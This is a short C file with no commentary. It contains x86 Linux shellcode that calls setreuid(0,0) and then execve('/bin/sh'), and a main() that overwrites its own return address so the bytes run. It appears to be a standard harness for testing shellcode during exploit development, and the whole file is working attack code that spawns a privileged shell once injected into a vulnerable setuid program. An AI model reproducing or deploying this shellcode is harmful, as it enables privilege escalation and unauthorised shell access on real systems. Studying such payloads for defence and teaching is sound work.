#include <unistd.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =  "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"\
	                  "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"\
                    "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"\
            	      "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"\
	                  "\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42";

int main(int argc, char *argv[]) {
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int) shellcode;
}